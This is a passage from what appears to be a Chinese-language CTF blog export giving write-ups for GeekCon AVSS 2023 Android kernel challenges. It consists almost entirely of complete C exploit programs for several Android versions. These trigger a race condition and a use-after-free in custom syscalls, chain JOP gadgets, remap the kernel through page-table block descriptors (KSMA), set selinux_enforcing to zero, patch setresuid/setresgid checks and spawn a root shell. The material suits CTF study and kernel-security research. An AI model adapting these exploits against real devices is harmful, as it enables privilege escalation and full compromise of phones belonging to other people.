dest_num;\n\t}\n\t\n\tfinish = 1;\n\tpthread_join(t1, NULL);\t\n\n\t// int ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t// if (ret < 0)\n\t// \tprintf(\"Execute syscall failed.\\n\");\t\n    // return 0;\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr = 0xFFFFFFC0009CB4A4;\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC0000AF650;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x34;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC0000AF8B0;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x35;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n\treturn 0;\n}\n```\n\n\n\n## android 9\n\n> 内核版本：linux 3.18.94\n\n跟 android8 的利用相同，只需要改改gadget地址和一些函数的地址即可。\n\nexp如下：\n\n```c\n#include <unistd.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <linux/keyctl.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <unistd.h>\n#include <sys/mman.h>\n\n\n#define SYS_race 604\n\nstruct mystruct {\n    volatile size_t size;\n    char  buffer[0];\n};\n\nstatic unsigned int try_num = 100;\nstatic unsigned int dest_num = 0x20;\nstatic unsigned int evil_value = 0x10;\n\nint finish = 0;\n#define TIME_GAP 100\n\nvoid flipping_thread(struct mystruct * st1)\n{\t\n\twhile(!finish) {\n\t\tst1->size = dest_num;\n\t\tusleep(TIME_GAP);\n\t\tst1->size = evil_value;\n\t\tusleep(TIME_GAP);\n\t}\t\n\t\n}\n\n#define buffersize 0x10000\n\nunsigned long swapper_pg_dir = 0xFFFFFFC000A09000;\nunsigned long d_block_addr = 0x0;\nunsigned long d_block = 0x0;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"d_block_addr: 0x%lx + %d x 8 = 0x%lx\\n\", swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n#define GADGET1 0xffffffc0004efd90          // ldr x3, [x0, #0x18] ; mov x22, x2 ; ldr x20, [x0] ; ldr x23, [x0, #0x10] ; cbz x3, #0xffffffc0004efdc8 ; blr x3\n#define GADGET2 0xffffffc0001e3474          // ldr x2, [x0, #0x68] ; ldr x22, [x0, #0x78] ; cbz x2, #0xffffffc0001e3514 ; mov x0, x20 ; mov x1, x23 ; blr x2\n#define GADGET3 0xffffffc000149948          // str x20, [x23, #8] ; mov x1, x23 ; ldr x2, [x22, #8] ; blr x2\n#define GADGET4 0xFFFFFFC0000BEDE4          // handle_128() return\n\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC000080000\n\nint main(int argc, char *argv[]){\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    void* user_addr = mmap((void*)0x40000000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);\n    if( user_addr == (void*)-1) err(1, \"mmap() failed\");\t\n\n// mystruct\n\tstruct mystruct* st = malloc(sizeof(struct mystruct) + 0x20);\n    *((unsigned long*)st->buffer)=0xe3575ca28750bdec;       // random\n    *(((unsigned long*)st->buffer)+1)=0x2355615aefbd6548;   // random\n    *(((unsigned long*)st->buffer)+2)=0xFFFFFFC0000BEAA0;    // cryptoctx_getbits() func 0xFFFFFFC0000BEE90;     \n    *(((unsigned long*)st->buffer)+3)=GADGET1;           // hijack 1\n    st->size = dest_num;\n\n    int digestsize = 0x100;\n\tchar* buff = malloc(buffersize);\n\tchar* digest = malloc(digestsize);\n\tmemset(buff, 0, buffersize);\n\tmemset(digest, 0, digestsize);\n\n// race\n\tpthread_t t1;\n\tpthread_create(&t1, NULL, flipping_thread, st);\n\n\tfor (int i = 0; i < try_num; i++) {\n\n        // gadget\n        *(unsigned long*)(buff)=d_block;          // gadget1: x20(aaw value)\n        *(unsigned long*)(buff+0x10)=d_block_addr-0x8;           // gadget1: x23(aaw address-0x8)\n        *(unsigned long*)(buff+0x18)=GADGET2;           // gadget1: x3, hijack 2 \n        *(unsigned long*)(buff+0x68)=GADGET3;           // gadget2: x2, hijack 3\n        *(unsigned long*)(buff+0x78)=user_addr;           // gadget2: x22\n        *(unsigned long*)(user_addr+0x8)=GADGET4;          // gadget3: x2, hijack 4\n\n\t\tprintf(\"Try for the %d time\\n\", i);\n\t\tint ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t\tif (ret < 0)\n\t\t\tprintf(\"Execute syscall failed.\\n\");\t\n\t\tst->size = dest_num;\n\t}\n\t\n\tfinish = 1;\n\tpthread_join(t1, NULL);\t\n\n\t// int ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t// if (ret < 0)\n\t// \tprintf(\"Execute syscall failed.\\n\");\t\n    // return 0;\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr = 0xFFFFFFC0009CB334;\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC0000AF260;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x34;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC0000AF4C0;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x35;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n\treturn 0;\n}\n```\n\n\n\n\n\n## android 10\n\n> 内核版本：linux 4.14.175\n\n该环境中开启了PAN，无法再使用用户态构造的数据。所以先前在android 7/8/9中需要访问用户态数据的gadget不能再使用了。\n\n比较幸运的是，发现一条无需访问用户态数据即可完成一次任意地址写的gadget，如下：\n\n```\n0xffffff80084b9224 : ldr x8, [x0, #0xc8] ; ldr x9, [x0, #8] ; ldr x10, [x0, #0xe0] ; mov x29, sp ; str x9, [x8, #8] ; ldr x9, [x0] ; mov x0, x8 ; str x9, [x8] ; ldr x9, [x10, #0x30] ; blr x9\n```\n\n所以，总体利用思路同android 7/8/9，只是JOP所使用的gadget不同了。\n\nexp如下：\n\n```c\n#include <unistd.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <linux/keyctl.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <sched.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sched.h>\n#include <unistd.h>\n#include <sys/mman.h>\n\n\n#define SYS_race 604\n\nstruct mystruct {\n    volatile size_t size;\n    char  buffer[0];\n};\n\nstatic unsigned int try_num = 200;\nstatic unsigned int dest_num = 0x20;\nstatic unsigned int evil_value = 0x10;\n\nint finish = 0;\n#define TIME_GAP 100\n\nvoid flipping_thread(struct mystruct * st1)\n{\t\n\twhile(!finish) {\n\t\tst1->size = dest_num;\n\t\tusleep(TIME_GAP);\n\t\tst1->size = evil_value;\n\t\tusleep(TIME_GAP);\n\t}\t\n\t\n}\n\n#define buffersize 0x10000\n\nunsigned long swapper_pg_dir = 0xffffff8008f0c000;\nunsigned long d_block_addr = 0x0;\nunsigned long d_block = 0x0;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"d_block_addr: 0x%lx + %d x 8 = 0x%lx\\n\", swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n// #define GADGET1 0xffffffc0004efd90          // ldr x3, [x0, #0x18] ; mov x22, x2 ; ldr x20, [x0] ; ldr x23, [x0, #0x10] ; cbz x3, #0xffffffc0004efdc8 ; blr x3\n// #define GADGET2 0xffffffc0001e3474          // ldr x2, [x0, #0x68] ; ldr x22, [x0, #0x78] ; cbz x2, #0xffffffc0001e3514 ; mov x0, x20 ; mov x1, x23 ; blr x2\n// #define GADGET3 0xffffffc000149948          // str x20, [x23, #8] ; mov x1, x23 ; ldr x2, [x22, #8] ; blr x2\n// #define GADGET4 0xFFFFFFC0000BEDE4          // handle_128() return\n\n#define GADGET1 0xffffff80084b9224              // ldr x8, [x0, #0xc8] ; ldr x9, [x0, #8] ; ldr x10, [x0, #0xe0] ; mov x29, sp ; str x9, [x8, #8] ; ldr x9, [x0] ; mov x0, x8 ; str x9, [x8] ; ldr x9, [x10, #0x30] ; blr x9\n#define GADGET2 0xFFFFFF80080DB420              // handle_128() return\n\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFF8008080000\n\nint main(int argc, char *argv[]){\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    void* user_addr = mmap((void*)0x40000000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);\n    if( user_addr == (void*)-1) err(1, \"mmap() failed\");\t\n\n// mystruct\n\tstruct mystruct* st = malloc(sizeof(struct mystruct) + 0x20);\n    *((unsigned long*)st->buffer)=0xe3575ca28750bdec;       // random\n    *(((unsigned long*)st->buffer)+1)=0x2355615aefbd6548;   // random\n    *(((unsigned long*)st->buffer)+2)=0xFFFFFF80080DB018;    // cryptoctx_getbits() func 0xFFFFFFC0000BEE90;     \n    *(((unsigned long*)st->buffer)+3)=GADGET1;           // hijack 1\n    st->size = dest_num;\n\n    int digestsize = 0x100;\n\tchar* buff = malloc(buffersize);\n\tchar* digest = malloc(digestsize);\n\tmemset(buff, 0, buffersize);\n\tmemset(digest, 0, digestsize);\n\n// race\n\tpthread_t t1;\n\tpthread_create(&t1, NULL, flipping_thread, st);\n\n\tfor (int i = 0; i < try_num; i++) {\n\n        // gadget\n        *(unsigned long*)(buff)=GADGET2;        // gadget1: stage2: x9\n        *(unsigned long*)(buff+0x8)=d_block;        // gadget1: x9(aaw value)\n        *(unsigned long*)(buff+0xc8)=d_block_addr-0x8;      // gadget1: x8(aaw address-0x8)\n        *(unsigned long*)(buff+0xe0)=d_block_addr-0x8-0x30;     // gadget1: stage 2: cache_addr(d_block_addr-0x8)       \n\n\t\tprintf(\"Try for the %d time\\n\", i);\n\t\tint ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t\tif (ret < 0)\n\t\t\tprintf(\"Execute syscall failed.\\n\");\t\n\t\tst->size = dest_num;\n\t}\n\t\n\tfinish = 1;\n\tpthread_join(t1, NULL);\t\n\n    //     *(unsigned long*)(buff)=GADGET2;        // gadget1: stage2: x9\n    //     *(unsigned long*)(buff+0x8)=d_block;        // gadget1: x9(aaw value)\n    //     *(unsigned long*)(buff+0xc8)=d_block_addr-0x8;      // gadget1: x8(aaw address-0x8)\n    //     *(unsigned long*)(buff+0xe0)=d_block_addr-0x8-0x30;     // gadget1: stage 2: cache_addr(d_block_addr-0x8)     \n\t// int ret = syscall(SYS_race, st, buff, buffersize, digest);\n\t// if (ret < 0)\n\t// \tprintf(\"Execute syscall failed.\\n\");\t\n    // return 0;\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr = 0xFFFFFF8008EDA770;\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFF80080C7074;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x36;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFF80080C7524;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x36;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n\treturn 0;\n}\n```\n\n\n\n","tags":["kernel pwn","android"],"categories":["GeekCon 2023"]},{"title":"GeekCon AVSS 2023 Qualifier - kSysUAF","url":"/2023/09/18/230918-kSysUAF/","content":"\n\n\n![image-20230918173733385](image-20230918173733385.png)\n\n附件：[KV3.tar.gz](KV3.tar.gz)\n\n\n\n# 漏洞分析\n\n在新创建的602号系统调用中，存在一个UAF漏洞\n\n```c\n#define BUFSZ 256\nstruct st1{\n    char name[BUFSZ];\n    char str[128];\n};\n\nstruct st1 * gst1[ARR_SIZE];\n\nnoinline void del_buffer(unsigned int idx) {\n    if (gst1[idx]) {\n        kfree(gst1[idx]);\t\t// kfree后未清空全局变量gst1[idx]中的地址\n    }\n}\n```\n\n这个UAF的特点：\n\n- 具备 UAF 读和写的双重能力（但只能读写前256字节，那后面128字节有什么用呢？）\n\n  ```c\n  noinline void show_buffer(char __user * addr, unsigned long len, unsigned int idx) {\n      if (gst1[idx]) {\n          if (len <= BUFSZ)\n              my_ctu(gst1[idx]->name, addr, len);\n      }\n  }\n  \n  noinline void edit_buffer(char __user * addr, unsigned long len, unsigned int idx) {\n      if (gst1[idx]) {\n          if (len <= BUFSZ)\n              my_cfu(gst1[idx]->name, addr, len);\n      }\n  }\n  ```\n\n- UAF的堆块大小为 256+128=384，在kmalloc-512中\n\n  ```bash\n  $ cat /proc/slabinfo\n  [...]\n  kmalloc-8192          16     16   8192    4    8 : tunables    0    0    0 : slabdata      4      4      0\n  kmalloc-4096          80     80   4096    8    8 : tunables    0    0    0 : slabdata     10     10      0\n  kmalloc-2048         136    136   2048    8    4 : tunables    0    0    0 : slabdata     17     17      0\n  kmalloc-1024         255    264   1024    8    2 : tunables    0    0    0 : slabdata     33     33      0\n  kmalloc-512          411    432    512    8    1 : tunables    0    0    0 : slabdata     54     54      0\n  kmalloc-256         1986   2352    256   16    1 : tunables    0    0    0 : slabdata    147    147      0\n  kmalloc-192         1323   1323    192   21    1 : tunables    0    0    0 : slabdata     63     63      0\n  kmalloc-128         2816   2816    128   32    1 : tunables    0    0    0 : slabdata     88     88      0\n  kmalloc-64         17383  18816     64   64    1 : tunables    0    0    0 : slabdata    294    294      0\n  [...]\n  ```\n\n  \n\n# 漏洞利用\n\nandroid 7/8/9：\n\n- 使用iovec（pipe readv）占住释放的堆块\n- 利用UAF写改掉iovec中的地址\n- 往管道中写入内容，就能达到任意地址写任意值的目的（到android 10上该方法不适用了）\n- KSMA提权\n\nandroid 10/11：\n\n- 改freelist链表，实现任意地址写任意值\n- 参考[星盟安全的wp](https://mp.weixin.qq.com/s/tkZnkxrkhm7TrFzlbrHhZg)，构造任意地址读写原语，搜索init_task中task_struct链表来提权\n\n比赛的时候忘了可以直接改freelist链表了，一直在找有哪个结构体大小可以满足kmalloc-512的。\n\n## android 7\n\n> 内核版本：linux 3.10.0\n\nexp如下\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_UAF 602\n\nunsigned long arg1, arg2, arg3;\n\n\nvoid* new_buffer(int idx){\n    void* ret = 0;\n    arg3 = ((idx &0xff)<<8)|(0&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    ret = syscall(SYS_UAF, 0, 0, arg3);\n    return ret;\n}\n\nvoid del_buffer(int idx){\n    arg3 = ((idx &0xff)<<8)|(1&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, 0, 0, arg3);\n}\n\nvoid show_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(2&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\nvoid edit_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(3&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\n// void call(int idx){\n//     arg3 = ((idx &0xff)<<8)|(4&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n//     syscall(SYS_UAF, arg1, arg2, arg3);\n// }\n\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\n\nunsigned long SYMBOL__swapper_pg_dir = 0xFFFFFFC00007D000;\n\n#define IOVEC_NUM 17\n#define UAF_INDEX 4\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC000080000\n// #define WRITE_ADDR 0xFFFFFFC000618AB0\n// #define WRITE_SIZE 0x8\nunsigned long selinux_enforcing_addr = 0xFFFFFFC0006EBACC;\n\nint pipe_fd[2];\nunsigned long d_block_addr;\nunsigned long d_block;\n\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = SYMBOL__swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"descriptor: 0x%lx + %d x 8 = 0x%lx\\n\", SYMBOL__swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n\nvoid* write_pipe(void* arg){\n// WRITE CONTENT    \n    unsigned long cont_buffer[2] = {0}; \n    cont_buffer[0] = d_block;\n    cont_buffer[1] = d_block;\n\n// WRITE TARGET_ADDR\n    unsigned long target_addr[2] = {0};\n    target_addr[0] = d_block_addr;\n    target_addr[1] = 0x10;\n\n    sleep(3);\n\n    edit_buffer(target_addr, 0x10, UAF_INDEX);\n    printf(\"child: write to pipe\\n\");\n    write(pipe_fd[1], cont_buffer, 0x10);\n\n    hexdump(target_addr, 0x10);\n    hexdump(cont_buffer, 0x10);\n    printf(\"child: exit\\n\");\n    return 0;\n}\n\nint main(){\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    pthread_t thr_write;\n    pthread_create(&thr_write, NULL, write_pipe, NULL);\n\n    void* test_addr = malloc(0x200);\n\n    struct iovec iovec_arr[IOVEC_NUM] = {0};           // heap size: 0x10*17=272\n    pipe(pipe_fd);\n    memset(iovec_arr, 0x0, sizeof(iovec_arr));\n    printf(\"sizeof(iovec_arr): %d\\n\", sizeof(iovec_arr));\n    iovec_arr[0].iov_base = test_addr;\n    iovec_arr[0].iov_len = 0x10;\n\n    new_buffer(UAF_INDEX);\n    del_buffer(UAF_INDEX);\n\n    // unsigned long target_addr[2] = {0};\n    // target_addr[0] = 0xFFFFFFC000618AB0;\n    // target_addr[1] = 0x10;\n    // edit_buffer(target_addr, 0x10, UAF_INDEX);\n\n    readv(pipe_fd[0], iovec_arr, IOVEC_NUM);\n\n    printf(\"read pipe: 0x%lx 0x%lx\\n\", *(unsigned long*)test_addr, *(unsigned long*)(test_addr+0x8));\n\n    pthread_join(thr_write, NULL);\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFFC0000ADF44;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x34;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFFC0000AE1BC;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x35;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n    return 0;\n}\n```\n\n\n\n## android 8\n\n>  内核版本：linux 3.18.94\n\nexp如下\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_UAF 602\n\nunsigned long arg1, arg2, arg3;\n\n\nvoid* new_buffer(int idx){\n    void* ret = 0;\n    arg3 = ((idx &0xff)<<8)|(0&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    ret = syscall(SYS_UAF, 0, 0, arg3);\n    return ret;\n}\n\nvoid del_buffer(int idx){\n    arg3 = ((idx &0xff)<<8)|(1&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, 0, 0, arg3);\n}\n\nvoid show_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(2&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\nvoid edit_buffer(void* addr, unsigned long len, int idx){\n    arg1 = addr;\n    arg2 = len;\n    arg3 = ((idx &0xff)<<8)|(3&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n    syscall(SYS_UAF, arg1, arg2, arg3);\n}\n\n// void call(int idx){\n//     arg3 = ((idx &0xff)<<8)|(4&0xff);\n    // printf(\"arg3: 0x%lx\\n\", arg3);\n//     syscall(SYS_UAF, arg1, arg2, arg3);\n// }\n\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\n\nunsigned long SYMBOL__swapper_pg_dir = 0xFFFFFFC000A05000;\n\n#define IOVEC_NUM 17\n#define UAF_INDEX 6\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFFC000080000\n// #define WRITE_ADDR 0xFFFFFFC000618AB0\n// #define WRITE_SIZE 0x8\nunsigned long selinux_enforcing_addr = 0xFFFFFFC0009C7524;\n\nint pipe_fd[2];\nunsigned long d_block_addr;\nunsigned long d_block;\n\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = SYMBOL__swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"descriptor: 0x%lx + %d x 8 = 0x%lx\\n\", SYMBOL__swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 